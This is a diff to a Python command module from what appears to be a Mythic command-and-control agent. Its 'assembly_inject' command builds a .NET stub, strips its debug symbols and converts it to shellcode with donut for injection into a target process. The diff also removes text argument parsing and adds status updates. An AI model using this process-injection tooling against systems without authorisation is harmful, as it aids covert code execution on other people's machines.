@@ -81,20 +81,6 @@ class AssemblyInjectArguments(TaskArguments):
     async def parse_arguments(self):
         if self.command_line[0] == "{":
             self.load_args_from_json_string(self.command_line)
-        else:
-            parts = self.command_line.split(" ", maxsplit=2)
-            if len(parts) < 2:
-                raise Exception("Invalid number of arguments.\n\tUsage: {}".format(AssemblyInjectCommand.help_cmd))
-            pid = parts[0]
-            assembly_name = parts[1]
-            assembly_args = ""
-            assembly_args = ""
-            if len(parts) > 2:
-                assembly_args = parts[2]
-            self.args["pid"].value = pid
-            self.args["assembly_name"].value = assembly_name
-            self.args["assembly_arguments"].value = assembly_args
-
 
 
 class AssemblyInjectCommand(CommandBase):
@@ -112,7 +98,7 @@ class AssemblyInjectCommand(CommandBase):
         agent_build_path = tempfile.TemporaryDirectory()
         outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name)
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/ExecuteAssembly/ExecuteAssembly.csproj -o {}/ExecuteAssembly/bin/Release/".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/ExecuteAssembly/ExecuteAssembly.csproj -o {}/ExecuteAssembly/bin/Release/".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                      stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
@@ -129,8 +115,15 @@ class AssemblyInjectCommand(CommandBase):
         global EXEECUTE_ASSEMBLY_PATH
         taskData.args.add_arg("pipe_name",  str(uuid4()))
         if not path.exists(EXEECUTE_ASSEMBLY_PATH):
+            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+                TaskID=taskData.Task.ID,
+                UpdateStatus=f"building injection stub"
+            ))
             await self.build_exeasm()
-
+        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+            TaskID=taskData.Task.ID,
+            UpdateStatus=f"generating stub shellcode"
+        ))
         donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name"))
         file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
             TaskID=taskData.Task.ID,
